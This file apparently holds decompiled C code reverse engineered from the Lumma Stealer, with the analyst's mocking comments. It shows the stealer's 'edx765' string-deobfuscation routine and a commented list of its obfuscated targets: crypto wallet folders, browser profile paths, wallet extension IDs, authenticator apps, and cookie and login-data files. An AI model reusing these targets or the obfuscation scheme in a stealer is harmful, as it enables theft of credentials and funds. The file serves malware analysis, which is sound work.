/* ////////////////////////////////////////////////////////////////////
// Reverse Engineered from the Lumma Stealer Binary               //
//                                                                 //
// This function is a perfect example of skid-tier coding. It's    //
// supposed to deobfuscate strings by removing the weak-ass        //
// "edx765" marker that these wannabe malware devs slapped on.     //
// Seriously, this level of obfuscation is laughable—no real       //
// malware developer would rely on something this fragile.         //
//                                                                 //
// So, what does this dumpster fire do?                            //
// 1. It scans the input string for instances of "edx765".        //
// 2. Counts how many times it appears (because apparently,        //
//    they couldn't even come up with a better encoding method).   //
// 3. Allocates a new buffer (hope they free it later, but skids   //
//    usually don't) that excludes "edx765" from the original.    //
// 4. Copies over everything except their pathetic obfuscation tag.//
//                                                                 //
// This function is used in the stealer to remove unnecessary     //
// junk markers from strings before processing or displaying them. //
// But come on, even the most basic static analysis will see       //
// through this weak encoding.                                     //
//                                                                 //
// Final thoughts? This isn't even skiddy-level evasion—it's a     //
// desperate attempt by clueless malware devs who think a simple   //
// substring removal equals "encryption." If your stealer is this //
// bad, just quit now.                                             //
///////////////////////////////////////////////////////////////////// */

#include "../HEADER/HEADER.c"

char* __fastcall TrasStrings(char* src) {
  char *p, *out, *ptr, *match;
  unsigned int len = strlen(src);
  int cnt = 0;

  for (p = strstr(src, "edx765"); p; p = strstr(p + 6, "edx765"))
    ++cnt;

  out = (char *)malloc(len - 6 * cnt + 1);
  if (!out) return NULL;

  ptr = out;
  match = strstr(src, "edx765");

  while (match) {
    int diff = match - src;
    strncpy(ptr, src, diff);
    ptr += diff;
    src = match + 6;
    match = strstr(src, "edx765");
  }

  strcpy(ptr, src);
  return out;
}

PWSTR *GetFilePath(wchar_t *Src)
{
  const wchar_t *strStart;
  int removeCount = 0;
  wchar_t *currentPos;
  wchar_t *strEnd;
  int strLength;
  wchar_t *matchPos;
  void *allocatedMem;
  PWSTR *result;
  BYTE *memPos;
  wchar_t *nextMatchPos;
  int strPartLength;
  wchar_t currentChar;

  strStart = Src;
  currentPos = Src;
  strEnd = Src + 1;

  while (*currentPos++) ;

  strLength = currentPos - strEnd;

  for (matchPos = wcsstr(strStart, L"edx765"); matchPos; matchPos = wcsstr(matchPos + 6, L"edx765"))
    ++removeCount;

  allocatedMem = malloc((unsigned __int64)(unsigned int)(strLength - 6 * removeCount + 1) >> 31 != 0 ? -1 : 2 * (strLength - 6 * removeCount + 1));
  result = allocatedMem;
  
  if (!allocatedMem)
    return result;

  memPos = allocatedMem;

  nextMatchPos = wcsstr(strStart, L"edx765");
  if (nextMatchPos)
  {
    do
    {
      strPartLength = nextMatchPos - strStart;
      memset__blabla(memPos, strStart, strPartLength);
      memPos += 2 * strPartLength;
      memset__blabla(memPos, &unk_425704, 0);
      strStart = nextMatchPos + 6;
      nextMatchPos = wcsstr(strStart, L"edx765");
    } while (nextMatchPos);
    result = allocatedMem;
  }

  // Copy the remaining part of the string
  strPartLength = memPos - (_BYTE *)strStart;
  do
  {
    currentChar = *strStart;
    *(const wchar_t *)((char *)strStart + strPartLength) = *strStart;
    ++strStart;
  }
  while (currentChar);

  return result;
}


/*

"Importedx765ant Fileedx765s/Proedx765file"
"*.edx765txt"
"%userproedx765file%"
"Walledx765ets/Binanedx765ce"
"apedx765p-stoedx765re.jsedx765on"
"%appdaedx765ta%\\Binaedx765nce"
"Walledx765ets/Eleedx765ctrum"
"*edx765"
"%appdedx765ata%\\Eledx765ectrum\\waledx765lets"
"Walledx765ets/Ethedx765ereum"
"keystedx765ore"
"%appdedx765ata%\\Etheedx765reum"
"Chredx765ome"
"%loedx765calappedx765data%\\Goedx765ogle\\Chredx765ome\\Usedx765er Datedx765a"
"Chromiedx765um"
"%localappdata%\\Chroedx765mium\\Useedx765r Data"
"Ededx765ge"
"%localaedx765ppdata%\\Micedx765rosoft\\Edge\\Usedx765er Data"
"Komedx765eta"
"%locedx765alappdaedx765ta%\\Komedx765eta\\Usedx765er Daedx765ta"
"Vivaedx765ldi"
"%localedx765appdata%\\Viedx765valdi\\Usedx765er Data"
"Braedx765ve"
"%localapedx765pdata%\\Braedx765veSofedx765tware\\Brex765ave-Broedx765wser\\Usedx765er Data"
"Opedx765era Staedx765ble"
"%appdedx765ata%\\Opeedx765ra Softedx765ware\\Opedx765era Staedx765ble"
"Opedx765era Gedx765X Stabedx765le"
"%appdedx765ata%\\Opedx765era Softwedx765are\\Opedx765era GX Staedx765ble"
"Opedx765era Neoedx765n"
"%appdaedx765ta%\\Opedx765era Softwaedx765re\\Opedx765era Neoedx765n\\Usedx765er Daedx765ta"
"Moziedx765lla Firefedx765ox"
"%appdaedx765ta%\\Moedx765zilla\\Firedx765efox\\Profedx765iles"


=========================================================
= calls 



    lstrcatW(lpString1, GetFilePath(u"\Locedx765al Extensedx765ion Settinedx765gs\"));
    lstrcatW(lpString1_1, GetFilePath(u"/Extedx765ensioedx765ns/"));
    int16_t* eax_2 = GetFilePath(u"*edx765");



    from a function that related to Stealing etc...:
      - int16_t* eax = GetFilePath(u"Meedx765taMaedx765sk");
      - int16_t* eax_1 = GetFilePath(u"ejbalbakoplchlghecdaedx765lmeeeajnimhm");  
      - int16_t* eax_2 = GetFilePath(u"Meedx765taMaedx765sk");
      - int16_t* eax_3 = GetFilePath(u"nkbihfbeogaeaoehlefedx765nkodbefgpgknn");
      - int16_t* eax_4 = GetFilePath(u"Troedx765nLiedx765nk");
      - int16_t* eax_5 = GetFilePath(u"ibnejdfjmmkpcnlpebklmnkoeoihofec");
      - PWSTR var_14_3 = GetFilePath(u"Ronedx765in Walledx765et");
      - int16_t* eax_7 = GetFilePath(u"fnjhmkhhmkbedx765jkkabndcnnogagogbneec");    
      - PWSTR var_14_4 = GetFilePath(u"Binedx765ance Chaedx765in Waledx765let");     
      - int16_t* eax_9 = GetFilePath(u"fhbohimaelbohpjbbldcngcnapnedx765dodjp");     
      - PWSTR var_14_5 = GetFilePath(u"Coinbedx765ase");
      - int16_t* eax_14 = GetFilePath(u"hnfanknocfeedx765ofbddgcijnmedx765hnfnkdnaad");
      - int16_t* eax_50 = GetFilePath(u"Eedx765OS Authentiedx765cator");
      - int16_t* eax_51 = GetFilePath(u"GAuedx765th Autheedx765nticator");
      - int16_t* eax_52 = GetFilePath(u"Tredx765ezor Passwedx765ord Manager");
      - int16_t* eax_53 = GetFilePath(u"Hisedx765tory");
      - int16_t* eax_54 = GetFilePath(u"Loedx765gin Daedx765ta");
      - int16_t* eax_55 = GetFilePath(u"Logedx765in Daedx765ta Foedx765r Accedx765ount");
      - int16_t* eax_56 = GetFilePath(u"Histedx765ory");
      - int16_t* eax_57 = GetFilePath(u"Wedx765eb Daedx765ta");
      - int16_t* eax_58 = GetFilePath(u"Netwedx765ork\Cookedx765ies");





    lstrcatW(lpString1, GetFilePath(u"\Locedx765al Staedx765te"));



    from CollectSystemInfo func:
          - int16_t* eax_29 = GetFilePath(u"Systeedx765m.txt");

*/
